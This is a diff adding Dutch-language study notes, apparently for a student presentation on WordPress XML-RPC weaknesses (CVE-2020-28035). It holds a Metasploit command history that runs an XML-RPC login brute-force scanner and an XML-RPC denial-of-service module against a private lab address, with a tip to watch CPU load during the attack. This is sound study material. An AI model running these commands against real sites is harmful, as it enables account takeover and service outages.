@@ -127,3 +127,63 @@ https://www.youtube.com/watch?v=bZQ6vuFioZQ
 Via xmlrpc can you proberen inloggen en meerdere passwords en logins proberen tegelijkertijd. 
 
 
+
+
+
+Metsploit framework,
+launch het metasploit framework en kies dan de juiste 2 modules
+
+1   search wordpress_xmlrpx_login
+2   search wordpress_xmlrpc_login
+3   use auxiliary/scanner/http/wordpress_xmlrpc_login
+4   search wordpress_xmlrpc_login
+5   use auxiliary/scanner/http/wordpress_xmlrpc_login
+6   set RHOSTS 192.168.1.60
+7   set USER_FILE /home/osboxes/rcp.txt
+8   set PASS_FILE /home/osboxes/rcpp.txt
+9   run
+10  exit
+11  search cve:wp AND 5.0.0
+12  search
+13  search cve
+14  clear
+15  search
+16  clear
+17  search wordpress
+18  use auxiliary/dos/http/wordpress_xmlrpc_dos
+19  set RHOSTS 192.168.1.60
+20  sset RPORT 80
+21  set RPORT 80
+22  run
+23  set RLIMIT 10000000
+24  run
+25  use auxiliary/dos/http/wordpress_xmlrpc_dos
+26  set RHOSTS 192.168.1.60
+27  set RLIMIT 10000000
+28  set RPORT 80
+29  run
+30  use auxiliary/dos/http/wordpress_xmlrpc_dos
+31  set RHOSTS 192.168.1.60
+32  set RPORT 80
+33  set RLIMIT 10000000
+34  set THREADS 3
+35  ?
+36  show options
+37  exit
+38  history
+
+
+
+Gebruikt `top` op de target server voor cpu usage te zien bij DOS attack  
+
+
+
+Formulier 
+
+        CVE-2020-28035 https://www.cvedetails.com/cve/CVE-2020-28035/
+
+        Wordpress  voor de versie 5.5.2 maakt gebruik van XML-RPC, wat een potentieel beveiligingsrisico met zich meebrengt. Door een grote hoeveelheid HTTP-verzoeken naar de XML-RPC-endpoint te sturen, kunnen aanvallers een denial-of-service-aanval (DOS) uitvoeren.
+
+        Bovendien kan deze methode door aanvallers worden gebruikt om op een minder opvallende manier gebruikersnamen en wachtwoorden te achterhalen. Door honderden pogingen in één enkel XML-RPC-verzoek te verbergen, kan een aanvaller brute force-aanvallen uitvoeren om toegang te krijgen tot beveiligde gegevens.
+
+        In onze presentatie zullen we beide kwetsbaarheden demonstreren: de DOS-aanval en de gain privileges aanval.
